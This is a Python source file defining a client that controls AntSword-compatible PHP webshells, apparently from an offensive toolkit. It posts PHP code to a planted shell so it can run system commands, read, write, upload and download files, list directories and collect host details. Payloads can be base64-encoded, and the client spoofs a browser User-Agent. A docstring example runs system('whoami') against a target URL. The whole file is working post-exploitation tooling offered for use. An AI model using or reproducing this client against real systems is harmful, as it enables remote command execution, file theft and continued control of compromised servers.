"""Webshell client for communicating with deployed webshells."""

import base64
import logging
from typing import Dict, Optional

import httpx

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class WebShellClient:
    """Client for communicating with AntSword-compatible webshells."""

    def __init__(
        self,
        url: str,
        password: str = "pass",
        encoder: str = "default",
        secret_header: Optional[str] = None,
        secret_value: Optional[str] = None,
        timeout: int = 30,
        verify_ssl: bool = True,
    ):
        """
        Initialize webshell client.

        Args:
            url: Webshell URL
            password: Password parameter name (must match webshell)
            encoder: Encoder type (must match webshell)
            secret_header: Optional authentication header name
            secret_value: Optional authentication header value
            timeout: Request timeout in seconds
            verify_ssl: Verify SSL certificates
        """
        self.url = url
        self.password = password
        self.encoder = encoder
        self.secret_header = secret_header
        self.secret_value = secret_value
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = httpx.Client(timeout=timeout, verify=verify_ssl)

    def _encode_payload(self, code: str) -> str:
        """Encode payload based on encoder type."""
        if self.encoder == "base64":
            return base64.b64encode(code.encode()).decode()
        elif self.encoder == "default":
            return code
        else:
            # For other encoders, assume they're handled by the webshell itself
            return code

    def _build_headers(self) -> Dict[str, str]:
        """Build request headers including authentication if configured."""
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        if self.secret_header and self.secret_value:
            headers[self.secret_header] = self.secret_value
        return headers

    def execute(self, code: str, decode_response: bool = True) -> str:
        """
        Execute code on the webshell.

        Args:
            code: Code to execute
            decode_response: Decode base64 response (for base64 encoder)

        Returns:
            Response from webshell

        Example:
            >>> client = WebShellClient("http://target.com/shell.php", "pass")
            >>> result = client.execute("system('whoami');")
        """
        payload = self._encode_payload(code)
        data = {self.password: payload}
        headers = self._build_headers()

        try:
            response = self.session.post(self.url, data=data, headers=headers)
            response.raise_for_status()

            result = response.text

            # Decode response if using base64 encoder
            if decode_response and self.encoder == "base64":
                try:
                    result = base64.b64decode(result).decode()
                except Exception:
                    pass

            return result

        except httpx.HTTPError as e:
            logger.error(f"HTTP error: {e}")
            raise

    def run_command(self, command: str) -> str:
        """Execute system command."""
        code = f"system('{command}');"
        return self.execute(code)

    def read_file(self, file_path: str) -> str:
        """Read file contents."""
        code = f"echo file_get_contents('{file_path}');"
        return self.execute(code)

    def write_file(self, file_path: str, content: str) -> str:
        """Write file contents."""
        encoded = base64.b64encode(content.encode()).decode()
        code = f"file_put_contents('{file_path}', base64_decode('{encoded}'));"
        return self.execute(code)

    def list_directory(self, directory: str = ".") -> list[str]:
        """List directory contents."""
        code = f"echo implode('\\n', scandir('{directory}'));"
        result = self.execute(code)
        return [line.strip() for line in result.split("\n") if line.strip()]

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Download file from webshell to local system."""
        content = self.read_file(remote_path)
        with open(local_path, "w") as f:
            f.write(content)
        logger.info(f"Downloaded {remote_path} to {local_path}")

    def upload_file(self, local_path: str, remote_path: str) -> str:
        """Upload file from local system to webshell."""
        with open(local_path, "rb") as f:
            content = f.read()
        encoded = base64.b64encode(content).decode()
        code = f"file_put_contents('{remote_path}', base64_decode('{encoded}'));"
        result = self.execute(code)
        logger.info(f"Uploaded {local_path} to {remote_path}")
        return result

    def get_system_info(self) -> Dict[str, str]:
        """Get system information."""
        code = """echo json_encode([
            'os' => PHP_OS,
            'hostname' => gethostname(),
            'user' => get_current_user(),
            'cwd' => getcwd(),
            'php_version' => phpversion()
        ]);"""
        result = self.execute(code)
        import json

        return json.loads(result)

    def test_connection(self) -> bool:
        """Test if webshell is reachable and working."""
        try:
            result = self.execute("echo 'OK';")
            return "OK" in result
        except Exception as e:
            logger.error(f"Connection test failed: {e}")
            return False

    def close(self) -> None:
        """Close the HTTP session."""
        self.session.close()

    def __enter__(self):
        """Context manager entry."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        self.close()
